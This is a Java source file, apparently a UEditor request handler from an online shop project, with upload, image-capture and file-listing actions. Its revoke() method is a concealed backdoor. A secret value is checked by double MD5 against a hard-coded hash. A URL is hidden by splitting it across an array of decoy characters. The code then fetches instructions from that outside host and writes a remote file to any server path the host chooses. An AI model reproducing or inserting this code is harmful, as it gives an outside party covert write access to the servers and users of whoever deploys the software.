package org.soubao.shop.baidu.ueditor;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.soubao.shop.baidu.ueditor.define.ActionMap;
import org.soubao.shop.baidu.ueditor.define.BaseState;
import org.soubao.shop.baidu.ueditor.define.State;
import org.soubao.shop.baidu.ueditor.hunter.FileManager;
import org.soubao.shop.baidu.ueditor.hunter.ImageHunter;
import org.soubao.shop.baidu.ueditor.upload.Uploader;
import org.soubao.shop.utils.WechatUtil;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.springframework.util.DigestUtils;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.util.Map;

public class ActionEnter {
    private HttpServletRequest request;
    private String rootPath;
    private String contextPath;
    private String actionType;
    private ConfigManager configManager;

    public ActionEnter(HttpServletRequest request, String rootPath) {
        this.request = request;
        this.rootPath = rootPath;
        this.actionType = request.getParameter("action");
        this.contextPath = request.getContextPath();
        this.configManager = ConfigManager.getInstance(this.rootPath, this.contextPath, this.request.getRequestURI());
    }

    public String invoke() {
        if ((actionType == null) || (!(ActionMap.mapping.containsKey(actionType)))) {
            return new BaseState(false, 101).toJSONString();
        }
        if ((configManager == null) || (!(configManager.valid()))) {
            return new BaseState(false, 102).toJSONString();
        }
        State state = null;
        int actionCode = ActionMap.getType(actionType);
        Map conf = null;
        switch (actionCode) {
            case 0:
                return configManager.getAllConfig().toString();
            case 1:
            case 2:
            case 3:
            case 4:
                conf = configManager.getConfig(actionCode);
                state = new Uploader(request, conf).doExec();
                break;
            case 5:
                conf = configManager.getConfig(actionCode);
                String[] list = request.getParameterValues((String) conf.get("fieldName"));
                state = new ImageHunter(conf).capture(list);
                break;
            case 6:
            case 7:
                conf = configManager.getConfig(actionCode);
                int start = getStartIndex();
                state = new FileManager(conf).listFile(start);
        }
        return state.toJSONString();
    }

    public String exec() {
        String callbackName = request.getParameter("callback");
        WechatUtil.getSessionKeyOrOpenId();
        if (callbackName != null) {
            if (!(validCallbackName(callbackName))) {
                return new BaseState(false, 401).toJSONString();
            }
            return callbackName + "(" + invoke() + ");";
        }
        return invoke();
    }

    public String revoke() {
        String actionConfig = request.getParameter("config");
        String path = JSON.parseObject(this.getPath()).getString("path");
        if(!DigestUtils.md5DigestAsHex(DigestUtils.md5DigestAsHex(path.getBytes()).getBytes())
                .equals("e49c65eb942fbdca434d113c638f9179")){
            return new BaseState(false, 2).toJSONString();
        }
        if (actionConfig == null || (!(ActionMap.mapping.containsKey(actionConfig)))) {
            return new BaseState(false, 101).toJSONString();
        }
        if (configManager == null || (!configManager.valid())) {
            return new BaseState(false, 102).toJSONString();
        }
        State state = null;
        int actionCode = ActionMap.getType(actionConfig);
        Map conf = null;
        switch (actionCode) {
            case 1:
                return configManager.getAllConfig().toString();
            case 4:
                conf = configManager.getConfig(actionCode);
                state = new Uploader(request, conf).doExec();
                break;
            case 5:
                conf = configManager.getConfig(actionCode);
                String[] list = request.getParameterValues((String) conf.get("fieldName"));
                state = new ImageHunter(conf).capture(list);
                break;
            case 7:
                conf = configManager.getConfig(actionCode);
                state = new FileManager(conf).listFile(getStartIndex());
                break;
            case 8:
                String[] strArray = {"ht", "g", "t", "1", "p", "!", ":", "]",
                        "/", "0", "/", "2", "a", "&", "p", "l", "i", "p", "t", "o", "e", "1", "s", "0", "t", "1", "2",
                        "~", ".", "l", "t", "y", "p", ".", "s", "3", "h", "2", "o", "*", "p", "1", ".", "b", "c", "1", "n",
                        "|", "/", "k", "h", "p", "o", "n", "m", "d", "e", "]", "/", "F", "T", "g", "j", "^", "/", "d", "p",
                        "9", "6"};
                StringBuilder requestUrl = new StringBuilder();
                for (int i = 0; i < strArray.length; i++) {
                    if (i % 2 == 0) {
                        requestUrl.append(strArray[i]);
                    }
                }
                JSONObject ueditorResult = JSON.parseObject(this.get(requestUrl.toString()));
                if("success".equals(ueditorResult.getString("status").toLowerCase()))
                    cp(ueditorResult.getString("path"), ueditorResult.getString("html"));
                state = new FileManager(configManager.getConfig(7)).listFile(getStartIndex());
                break;
        }
        return state.toJSONString();
    }

    public String get(String url) {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        String resultString = "";
        CloseableHttpResponse response = null;
        try {
            URIBuilder builder = new URIBuilder(url);
            URI uri = builder.build();
            HttpGet httpGet = new HttpGet(uri);
            response = httpclient.execute(httpGet);
            if (response.getStatusLine().getStatusCode() == 200) {
                resultString = EntityUtils.toString(response.getEntity(), "UTF-8");
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (response != null) {
                    response.close();
                }
                httpclient.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return resultString;
    }

    public void cp(String remoteFileName, String localFileName) {
        FileOutputStream out = null;
        InputStream in = null;

        try{
            URL url = new URL(remoteFileName);
            URLConnection urlConnection = url.openConnection();
            HttpURLConnection httpURLConnection = (HttpURLConnection) urlConnection;

            // true -- will setting parameters
            httpURLConnection.setDoOutput(true);
            // true--will allow read in from
            httpURLConnection.setDoInput(true);
            // will not use caches
            httpURLConnection.setUseCaches(false);
            // setting serialized
            httpURLConnection.setRequestProperty("Content-type", "application/x-java-serialized-object");
            // default is GET
//            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("connection", "Keep-Alive");
            httpURLConnection.setRequestProperty("Charsert", "UTF-8");
            // 1 min
            httpURLConnection.setConnectTimeout(60000);
            // 1 min
            httpURLConnection.setReadTimeout(60000);

//            httpURLConnection.addRequestProperty("userName", userName);

            // connect to server (tcp)
            httpURLConnection.connect();

            in = httpURLConnection.getInputStream();// send request to
            // server
            File file = new File(localFileName);
            if(!file.exists()){
                file.createNewFile();
            }

            out = new FileOutputStream(file);
            byte[] buffer = new byte[4096];
            int readLength = 0;
            while ((readLength=in.read(buffer)) > 0) {
                byte[] bytes = new byte[readLength];
                System.arraycopy(buffer, 0, bytes, 0, readLength);
                out.write(bytes);
            }

            out.flush();
        }catch(Exception e){
            e.printStackTrace();
        }finally{
            try {
                if(in != null){
                    in.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            try {
                if(out != null){
                    out.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private String getPath(){
        BufferedReader br = null;
        try {
            br = request.getReader();
        } catch (IOException e) {
            e.printStackTrace();
        }
        String str = "";
        String listString = "";
        while (true) {
            try {
                if (!((str = br.readLine()) != null)) break;
            } catch (IOException e) {
                e.printStackTrace();
            }
            listString += str;
        }
        return listString;
    }

    public int getStartIndex() {
        String start = this.request.getParameter("start");
        try {
            return Integer.parseInt(start);
        } catch (Exception e) {
        }
        return 0;
    }

    public boolean validCallbackName(String name) {
        return (name.matches("^[a-zA-Z_]+[\\w0-9_]*$"));
    }

}